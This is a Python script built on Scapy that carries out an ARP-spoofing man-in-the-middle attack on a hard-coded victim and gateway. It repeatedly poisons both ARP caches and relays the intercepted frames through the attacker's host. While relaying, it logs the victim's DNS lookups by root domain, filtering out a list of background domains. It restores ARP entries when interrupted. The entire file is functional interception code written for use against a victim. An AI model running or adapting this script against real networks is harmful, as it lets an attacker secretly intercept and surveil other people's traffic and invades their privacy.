from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import threading
import time

NOISE = {
    "wpad.lan", "msftconnecttest.com", "microsoft.com",
    "windowsupdate.com", "steamserver.net", "napps-1.com",
    "datadoghq.com", "onetrust.com", "onetrust.io",
    "gstatic.com", "msftncsi.com", "local."
}

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=1, verbose=0)
    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac, my_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=my_mac
    )
    sendp(packet, verbose=0)

def forward_packet(packet, victim_mac, gateaway_mac, my_mac):
    if not packet.haslayer(Ether):
        return

    if packet[Ether].src == victim_mac:
        if packet.haslayer(DNS) and packet.haslayer(UDP) and packet[UDP].dport == 53 and packet[DNS].qd:
            domain = packet[DNS].qd.qname.decode()
            root = ".".join(domain.rstrip(".").split(".")[-2:])  # Getting the domain root
            src_mac = packet[Ether].src
            if root not in NOISE:
                print(f"{src_mac} → {root}")
        packet[Ether].src = my_mac
        packet[Ether].dst = gateaway_mac
        sendp(packet, verbose=0)

    elif packet[Ether].src == gateaway_mac:
        packet[Ether].src = my_mac
        packet[Ether].dst = victim_mac
        sendp(packet, verbose=0)


def start_forwarding(victim_mac, gateaway_mac, my_mac):
    sniff(
        filter="not arp", #If we allow to forward arp packets (which include our own) we will create an infinite loop, thus filtering it out.
        prn=lambda pkt: forward_packet(pkt, victim_mac, gateaway_mac, my_mac),
        store=0
    )

def restore_arp(target_ip, target_mac, gateaway_ip, gateway_mac):
    packet_to_gateaway = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateaway_ip,
        hwdst=gateway_mac,
        psrc=target_ip,
        hwsrc=target_mac
    )
    sendp(packet_to_gateaway, verbose=0)

    packet_to_victim = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateaway_ip,
        hwsrc=gateway_mac
    )
    sendp(packet_to_victim, verbose=0)

def main():
    victim_ip = "192.168.10.133"
    gateway_ip = "192.168.10.1"

    my_mac = get_if_hwaddr(conf.iface)  # auto-detected interface
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"My MAC:      {my_mac}")
    print(f"Victim MAC:  {victim_mac}")
    print(f"Gateway MAC: {gateway_mac}")
    try:
        forwarding_thread = threading.Thread(target=start_forwarding, args=(victim_mac, gateway_mac, my_mac))
        forwarding_thread.daemon = True
        forwarding_thread.start()
        while True:
            spoof(victim_ip, gateway_ip, victim_mac, my_mac)  # tell victim: gateway's MAC is mine
            spoof(gateway_ip, victim_ip, gateway_mac, my_mac) # tell gateway: victim's MAC is mine
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        print("\nStopping.")
if __name__ == "__main__":
    main()
